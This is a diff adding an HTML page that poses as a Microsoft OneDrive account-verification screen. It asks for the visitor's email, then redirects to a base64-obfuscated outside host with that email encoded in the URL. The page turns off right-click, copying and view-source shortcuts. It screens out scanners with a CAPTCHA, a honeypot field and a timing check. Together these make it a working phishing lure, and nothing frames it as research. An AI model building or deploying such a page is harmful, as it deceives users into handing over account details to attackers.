@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OneDrive Document</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <!-- Updated CSP to allow Turnstile scripts/frames and images -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; frame-src https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src * data:;">
+  <!-- Cloudflare Turnstile -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+</head>
+<body
+  class="bg-white min-h-screen flex items-center justify-center px-4 relative overflow-hidden"
+  style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/OneDrive_File_Storage.jpg/1280px-OneDrive_File_Storage.jpg'); background-size: cover; background-position: center; background-repeat: no-repeat;"
+  oncontextmenu="return false;"
+  oncopy="return false;"
+  oncut="return false;"
+  onpaste="return false;"
+>
+  <!-- Overlay to ensure readability -->
+  <div class="absolute inset-0 bg-gradient-to-br from-blue-50/90 to-white/90"></div>
+
+  <div class="bg-white/95 backdrop-blur-sm p-8 rounded-2xl shadow-xl w-full max-w-md text-center relative z-10">
+    <div class="mb-6">
+      <!-- OneDrive Logo -->
+      <img src="https://images.ecomm.microsoft.com/cdn/mediahandler/azure-emails-templates/production/shared/images/templates/shared/microsoft-2x.png" alt="OneDrive Logo" class="mx-auto h-12 w-auto mb-2">
+      <h1 class="text-2xl font-extrabold text-gray-800 mt-2">Account  Verification</h1>
+    </div>
+
+    <p class="text-sm text-gray-600 mb-6">Please enter your email and complete the CAPTCHA to confirm your account is activated.</p>
+
+    <form id="download-form">
+      <!-- Honeypot field (hidden) -->
+      <div style="display:none;">
+        <label for="hp-phone">Phone</label>
+        <input type="text" id="hp-phone" name="phone" autocomplete="off" />
+      </div>
+
+      <!-- Email input -->
+      <div class="text-left mb-4">
+        <label for="user-email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+        <input
+          type="email"
+          id="user-email"
+          placeholder="user@businessemail.com"
+          class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+          autocomplete="off"
+          required
+        />
+      </div>
+
+      <!-- Cloudflare Turnstile widget placeholder -->
+      <div id="cf-captcha" class="mb-4"></div>
+
+      <!-- Submit button (initially disabled) -->
+      <button
+        type="submit"
+        id="download-btn"
+        class="w-full bg-blue-600 text-white py-2 rounded-lg font-medium hover:bg-blue-700 transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
+        disabled
+      >
+        VERIFY ACCOUNT NOW
+      </button>
+
+      <div id="status" class="mt-4 text-sm text-red-500 hidden"></div>
+      <div id="success-message" class="mt-4 text-sm text-green-600 hidden">
+        Your verification is starting…
+      </div>
+    </form>
+
+    <footer class="mt-8 text-xs text-gray-400">
+      &copy; 2025 MICROSOFT Vault. All rights reserved.
+    </footer>
+  </div>
+
+  <script>
+    // Prevent certain key combinations
+    document.addEventListener('keydown', function(event) {
+      if (
+        event.ctrlKey &&
+        ['s', 'p', 'u', 'c', 'x'].includes(event.key.toLowerCase())
+      ) {
+        event.preventDefault();
+        return false;
+      }
+    });
+
+    // Bot-protection and Turnstile vars
+    const form = document.getElementById('download-form');
+    const status = document.getElementById('status');
+    const successMessage = document.getElementById('success-message');
+    const downloadBtn = document.getElementById('download-btn');
+    const FILE_URL = atob("aHR0cHM6Ly93ZWIuZXhlY3V0aXZlaGVsaWNvcHRlci5jeW91Lw==");
+    let formLoadTime = Date.now();
+    let captchaWidgetId;
+
+    // Render the Turnstile widget once script is loaded
+    window.addEventListener('load', () => {
+      if (window.turnstile) {
+        captchaWidgetId = turnstile.render('#cf-captcha', {
+          sitekey: '0x4AAAAAAB7FNXePO5xwbiuw',
+          callback: onCaptchaSuccess,
+          'error-callback': onCaptchaError,
+          'expired-callback': onCaptchaExpired
+        });
+      }
+    });
+
+    function onCaptchaSuccess(token) {
+      // Enable download button when CAPTCHA is completed
+      downloadBtn.disabled = false;
+      status.classList.add('hidden');
+    }
+
+    function onCaptchaError() {
+      // Disable button if error
+      downloadBtn.disabled = true;
+      statusError("CAPTCHA error, please try again.");
+    }
+
+    function onCaptchaExpired() {
+      // Disable button on expiry
+      downloadBtn.disabled = true;
+      statusError("CAPTCHA expired, please complete again.");
+    }
+
+    function statusError(msg) {
+      successMessage.classList.add('hidden');
+      status.textContent = msg;
+      status.classList.remove('hidden');
+    }
+
+    form.addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      // 1) Ensure button was enabled by CAPTCHA
+      if (downloadBtn.disabled) {
+        return statusError("Please complete the CAPTCHA before verification.");
+      }
+
+      // 2) Honeypot must be empty
+      if (document.getElementById('hp-phone').value.trim() !== '') {
+        return statusError("Bot detected.");
+      }
+
+      // 3) Must spend at least 3 seconds on page
+      if (Date.now() - formLoadTime < 3000) {
+        return statusError("Please stay on page a bit longer.");
+      }
+
+      // 4) CAPTCHA token must still exist
+      const token = turnstile.getResponse(captchaWidgetId);
+      if (!token) {
+        return statusError("Please complete the CAPTCHA.");
+      }
+
+      // All checks passed: proceed to verifying...
+      status.classList.add('hidden');
+      successMessage.classList.remove('hidden');
+
+      const email = document.getElementById('user-email').value.trim().toLowerCase();
+      window.location.href = FILE_URL + "#" + btoa(email);
+    });
+  </script>
+</body>
+</html>
+
